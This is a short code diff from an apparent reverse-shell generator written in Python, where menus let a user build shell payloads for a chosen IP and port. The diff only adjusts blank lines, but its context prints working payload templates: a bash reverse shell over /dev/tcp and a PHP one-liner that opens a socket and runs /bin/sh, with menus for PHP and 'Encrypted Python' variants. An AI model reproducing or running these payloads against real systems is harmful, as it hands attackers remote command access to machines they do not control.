@@ -53,7 +53,6 @@ def bash_reverse_shell():
         command = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
         print(f"Command: {command}")
         
-
 def php_reverse_shell():
     php_option = ["PHP web file", "PHP command", "Back to Main Menu"]
     php_menu = TerminalMenu(php_option, title="--- Select a PHP reverse shell type ---")
@@ -215,6 +214,7 @@ def php_reverse_shell():
         local_port = input("Enter the port netcat will be listening (tipically 4444): ")
         php_command = f"php -r '$sock=fsockopen(\"{local_ip}\",{local_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         print(f"Command: {php_command}")
+
 def python_reverse_shell():
     python_options = ["Encrypted Python", "Plaintext Python", "Back to Main Menu"]
     python_menu = TerminalMenu(python_options, title="--- Select a Python reverse shell type ---")
